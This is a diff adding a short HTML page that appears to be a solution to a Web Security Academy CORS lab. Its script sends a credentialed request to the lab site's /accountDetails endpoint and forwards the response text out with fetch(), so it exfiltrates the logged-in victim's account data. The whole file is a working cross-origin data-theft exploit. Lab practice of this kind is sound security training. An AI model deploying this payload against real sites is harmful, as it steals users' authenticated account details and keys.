@@ -1,0 +1,18 @@
+<html>
+    <body>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://0a1a007704d32a8281f59fa800410046.web-security-academy.net";
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch(xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
